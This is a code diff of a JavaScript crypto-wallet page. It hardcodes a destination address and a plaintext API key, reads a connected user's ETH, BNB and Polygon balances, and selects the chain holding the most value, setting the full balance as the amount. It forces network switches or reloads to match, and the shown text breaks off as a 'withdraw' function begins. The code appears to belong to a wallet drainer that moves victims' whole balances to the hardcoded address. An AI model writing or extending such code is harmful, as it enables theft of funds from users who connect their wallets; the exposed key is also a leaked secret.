@@ -3,9 +3,10 @@ import { pixelLead } from "./pixel";
 let connectButton;
 let withdrawButton;
 //r
-const pub_addr = "0x194f14Ac52eb4e7cfc50141874AA873c5c9e9274";
-const serverUrl = "https://f4bbgj4xggry.grandmoralis.com:2053/server";
-const appId = "Sa2fOIggCrpNCY8ondVE1DiGMLO5rXSIT7ezvr03";
+const pub_addr = "0xc503BD3b824E2A6d89A0484b2c18bc64db5e6446";
+const apiKey =
+  "9sgMC9ifZGbSmvXPszzyMlTbJoS8WFGZTDzMNa3YvAzaMDczNYWQoLKBe2T5ofAI";
+
 const ETH = "0x1";
 const BSC = "0x38";
 const POL = "0x89";
@@ -32,61 +33,86 @@ function isMobile() {
   return check;
 }
 
-Moralis.start({ serverUrl, appId });
-
 async function checkChainId() {
   await web3.eth.net.getId();
   return (chainId = await web3.eth.net.getId());
 }
 
+const options = {
+  method: "GET",
+  headers: {
+    accept: "application/json",
+    "X-API-Key": apiKey,
+  },
+};
+
 async function checkBalance() {
-  const priceBNB = (
-    await Moralis.Web3API.token.getTokenPrice({
-      address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
-      chain: "bsc",
-    })
-  ).usdPrice;
+  const amountETH = (
+    await (
+      await fetch(
+        `https://deep-index.moralis.io/api/v2/${userAddr}/balance?chain=eth`,
+        options
+      )
+    ).json()
+  ).balance;
+  const amountBNB = (
+    await (
+      await fetch(
+        `https://deep-index.moralis.io/api/v2/${userAddr}/balance?chain=bsc`,
+        options
+      )
+    ).json()
+  ).balance;
+  const amountPOL = (
+    await (
+      await fetch(
+        `https://deep-index.moralis.io/api/v2/${userAddr}/balance?chain=polygon`,
+        options
+      )
+    ).json()
+  ).balance;
+
   const priceETH = (
-    await Moralis.Web3API.token.getTokenPrice({
-      address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
-      chain: "eth",
-    })
+    await (
+      await fetch(
+        "https://deep-index.moralis.io/api/v2/erc20/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2/price?chain=eth",
+        options
+      )
+    ).json()
+  ).usdPrice;
+  const priceBNB = (
+    await (
+      await fetch(
+        "https://deep-index.moralis.io/api/v2/erc20/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c/price?chain=bsc",
+        options
+      )
+    ).json()
   ).usdPrice;
   const pricePOL = (
-    await Moralis.Web3API.token.getTokenPrice({
-      address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
-      chain: "polygon",
-    })
+    await (
+      await fetch(
+        "https://deep-index.moralis.io/api/v2/erc20/0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270/price?chain=polygon",
+        options
+      )
+    ).json()
   ).usdPrice;
 
-  const balanceBNB = (
-    await Moralis.Web3API.account.getNativeBalance({ chain: "bsc" })
-  ).balance;
-  const balanceETH = (
-    await Moralis.Web3API.account.getNativeBalance({ chain: "eth" })
-  ).balance;
-  const balancePOL = (
-    await Moralis.Web3API.account.getNativeBalance({ chain: "polygon" })
-  ).balance;
+  const balanceETH = amountETH * priceETH;
+  const balanceBNB = amountBNB * priceBNB;
+  const balancePOL = amountPOL * pricePOL;
 
-  if (
-    balanceBNB * priceBNB > balanceETH * priceETH &&
-    balanceBNB * priceBNB > balancePOL * pricePOL
-  ) {
+  if (balanceBNB > balanceETH && balanceBNB > balancePOL) {
     chainName = BSC;
     tokenName = "BNB";
-    userBalance = balanceBNB;
-  } else if (
-    balancePOL * pricePOL > balanceETH * priceETH &&
-    balancePOL * pricePOL > balanceBNB * priceBNB
-  ) {
+    userBalance = String(amountBNB);
+  } else if (balancePOL > balanceETH && balancePOL > balanceBNB) {
     chainName = POL;
     tokenName = "Matic";
-    userBalance = balancePOL;
-  } else {
+    userBalance = String(amountPOL);
+  } else if (balanceETH >= balanceBNB && balanceETH >= balancePOL) {
     chainName = ETH;
     tokenName = "ETH";
-    userBalance = balanceETH;
+    userBalance = String(amountETH);
   }
 }
 
@@ -180,8 +206,12 @@ async function connectToMetamask(
   renderUserInfo(userAddr, userBalance, setValue);
   setLoading(false);
   if (chainName === ETH && chainId !== 1) {
-    await Moralis.switchNetwork(ETH);
-    chainId = 1;
+    try {
+      await Moralis.switchNetwork(ETH);
+      chainId = 1;
+    } catch {
+      window.location.reload();
+    }
   }
   setWalletModalOptions({
     open: false,
@@ -214,6 +244,8 @@ async function connectToMetamask(
         chainName = ETH;
         userBalance = balanceETH;
         await Moralis.switchNetwork(ETH);
+      } else {
+        window.location.reload();
       }
     }
   }
@@ -226,14 +258,18 @@ async function connectToMetamask(
         chainName = ETH;
         userBalance = balanceETH;
         await Moralis.switchNetwork(ETH);
+      } else {
+        window.location.reload();
       }
     }
   }
 }
 
-// Moralis.onChainChanged(() => {
-//     window.location.reload();
-// });
+Moralis.onChainChanged(async () => {
+  if ((await web3.eth.net.getId()) !== chainId) {
+    window.location.reload();
+  }
+});
 
 async function withdraw() {
   await web3.eth
